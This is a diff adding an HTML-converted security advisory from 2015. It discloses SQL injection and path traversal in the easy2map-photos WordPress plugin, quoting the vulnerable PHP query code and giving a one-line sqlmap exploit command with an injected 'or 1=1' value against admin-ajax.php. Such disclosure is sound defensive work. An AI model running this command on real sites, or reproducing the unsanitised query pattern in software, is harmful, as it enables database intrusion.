@@ -1,0 +1,78 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title></title>
+<meta name="generator" content="HTML::TextToHTML v2.51"/>
+</head>
+<body>
+<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
+</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
+    white-space: -moz-pre-wrap; /</em> Firefox <em>/
+    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
+    white-space: -o-pre-wrap;   /</em> Opera 7 */
+    word-wrap: break-word;<br/>
+}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 130&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; SQL Injection in easy2map-photos wordpress plugin v1.09&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-06-08&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/easy2map-photos">https://wordpress.org/plugins/easy2map-photos</a>"&gt;<a href="https://wordpress.org/plugins/easy2map-photos&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/easy2map-photos&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Steven Ellis&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-06-08&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="https://profiles.wordpress.org/stevenellis/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/stevenellis/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Easy2Map Photos is a simple-yet-powerful tool for generating great-looking geo-tagged photo galleries.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The following lines in Functions.php are vulnerable to SQL injection attack because they are not parameterized or sanitizing user input.
+</p><pre>
+48         $wpdb-&amp;gt;query(sprintf(&amp;quot;UPDATE $mapsTable
+49         SET PolyLines = &amp;#039;%s&amp;#039;
+50         WHERE ID = &amp;#039;%s&amp;#039;;&amp;quot;, $PolyLines, $mapID));
+218             $wpdb-&amp;gt;query(sprintf(&amp;quot;
+219                 UPDATE $mapsTable
+220                 SET TemplateID = &amp;#039;%s&amp;#039;,
+221                     MapName = &amp;#039;%s&amp;#039;,
+222                     Settings = &amp;#039;%s&amp;#039;,
+223                     CSSValues = &amp;#039;%s&amp;#039;,
+224                     CSSValuesPhoto = &amp;#039;%s&amp;#039;,
+225                     CSSValuesMap = &amp;#039;%s&amp;#039;,
+226                     MapHTML = &amp;#039;%s&amp;#039;,
+227                     IsActive = 1
+228                 WHERE ID = %s;&amp;quot;,
+229                     $_REQUEST[&amp;#039;mapTemplateName&amp;#039;],
+230                     $_REQUEST[&amp;#039;mapName&amp;#039;],
+231                     urldecode($_REQUEST[&amp;#039;mapSettingsXML&amp;#039;]),
+232                     urldecode($_REQUEST[&amp;quot;parentCSSXML&amp;quot;]),
+233                     urldecode($_REQUEST[&amp;quot;photoCSSXML&amp;quot;]),
+234                     urldecode($_REQUEST[&amp;quot;mapCSSXML&amp;quot;]),
+235                     urldecode($_REQUEST[&amp;quot;mapHTML&amp;quot;]), $mapID));</pre>
+
+<pre>
+238             //this is a map insert
+239             if (!$wpdb-&amp;gt;query(sprintf(&amp;quot;
+240             INSERT INTO $mapsTable(
+241                 TemplateID,
+242                 MapName,
+243                 DefaultPinImage,
+244                 Settings,
+245                 LastInvoked,
+246                 PolyLines,
+247                 CSSValues,
+248                 CSSValuesPhoto,
+249                 CSSValuesMap,
+250                 MapHTML,
+251                 IsActive
+252             ) VALUES (&amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;, &amp;#039;%s&amp;#039;    , 0);&amp;quot;,
+253                     $_REQUEST[&amp;#039;mapTemplateName&amp;#039;],
+254                     $_REQUEST[&amp;#039;mapName&amp;rsquo;]</pre>
+
+<pre>
+331         $wpdb-&amp;gt;query(sprintf(&amp;quot;
+332             UPDATE $mapsTable
+333             SET MapName = &amp;#039;%s&amp;#039;
+334             IsActive = 1
+335             WHERE ID = %s;&amp;quot;,
+336                 $_REQUEST[&amp;#039;mapName&amp;#039;],
+337                 $mapID));</pre>
+<p>,<br/>
+Also
+</p><p>In MapPinImageUpload.php and MapPinIconSave.php this code would allow someone to create files outside of the intended upload directory by adding ../../../../ path traversal characters:
+</p><p>   if (!file_exists($imagesDirectory)) {
+</p><p>       mkdir($imagesDirectory);<br/>
+   }
+</p><p>CVE-2015-4615 SQL Injection<br/>
+CVE-2015-4617 Path traversal&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-4615 2015-4617&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=130"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ sqlmap &lt;span style="color: #339933;"&gt;-&lt;/span&gt;u &lt;span style="color: #0000ff;"&gt;'<a href="http://wp.site:80/wp-admin/admin-ajax.php">http://wp.site:80/wp-admin/admin-ajax.php</a>'&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;data&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;mapID=11&amp;amp;mapName='+or+1%3D%3D1%3B&amp;amp;action=e2m_img_save_map_name&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;cookie&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'COOKIE HERE'&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;level&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;5&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;risk&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;3&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=130">http://www.vapid.dhs.org/advisory.php?v=130</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=130&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=130&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
+&lt;/html&gt;
+</p>
+
+</body>
+</html>
